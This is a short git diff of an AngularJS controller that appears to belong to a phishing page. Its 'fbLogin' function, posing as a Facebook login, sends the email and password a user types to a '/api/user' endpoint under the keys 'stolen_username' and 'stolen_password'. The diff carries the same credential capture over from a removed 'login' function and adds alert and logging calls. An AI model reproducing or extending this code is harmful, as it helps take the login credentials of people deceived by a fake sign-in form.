@@ -3,28 +3,19 @@ var app = angular.module("app", []);
 app.controller("AppCtrl", function($http) {
     var app = this;
 
-    app.pls = "check@pls.com";
-    console.log(app.pls);
-    // alert(app.pls);
+    $http.get("/api/user").success(function(data) {
+        alert(data);
+        app.entries = data.objects;
+    })
 
-    // $http.get("/api/entry").success(function(data) {
-    //     app.entries = data.objects;
-    // })
-
-    app.login = function(username, password) {
-        $http.post("/api/entry", {"stolen_username": username, "stolen_password": password})
+    app.fbLogin = function() {
+        console.log(app);
+        $http.post("/api/user", {"stolen_username": app.email, "stolen_password": app.password})
             .success(function(data) {
                 app.entries.push(data);
             })
-
-    }
-
-    app.fbLogin = function() {
-        alert('hey ' + app.email);
-        console.log(app);
-        $http.post("/api/entry", {"stolen_username": app.email, "stolen_password": app.password})
-            .success(function(data) {
-                app.entries.push(data);
+            .error(function(data) {
+                alert(data);
             })
 
     }
